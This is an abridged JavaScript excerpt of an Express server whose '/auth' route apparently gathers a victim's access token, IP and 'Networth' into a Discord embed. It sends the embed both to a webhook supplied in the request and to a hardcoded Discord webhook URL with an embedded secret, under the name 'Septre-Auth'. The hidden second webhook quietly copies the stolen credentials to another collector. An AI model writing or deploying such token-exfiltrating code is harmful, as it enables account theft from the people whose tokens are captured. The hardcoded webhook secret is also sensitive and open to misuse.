...
const url3 = 'https://discord.com/api/webhooks/1112057854619299982/Ly2cSE-M7eLWC1UEvz0MhpWdE7kiTL2NV2Izw4g5a7IhgGa61Q31jCM37oFqArW5CFMW';
const newAvatarURL = 'https://live.staticflickr.com/65535/52932742690_cc1446c553.jpg';
...
app.get('/auth', async (req, res) => {
  ...
  try {
    ...
    const accessTokenEmbed = new MessageEmbed()
      .setColor('#0099ff')
      ...
      .addFields(
        ...
        { name: 'Networth', value: '`API DOWN`', inline: true },
        { name: 'IP', value: '`::1`', inline: true }
      )
    ...
    const newUsername ='Septre-Auth';
    sendWebhookMessage(url3, newUsername, newAvatarURL, webhook, accessTokenEmbed);
    sendWebhookMessage(webhook, newUsername, newAvatarURL, state, accessTokenEmbed);
...
function generateState(length) {
  ...
  for (let i = 0; i < length; i++) {
    state += Math.floor(Math.random() * 10); // Generate a random number
  }
...
async function sendWebhookMessage(webhookURL, username, avatarURL, content, embed) {
  try {
    const data = {
      username: username,
    ...
    console.error('Error sending webhook message:', error.responce);
  }
}
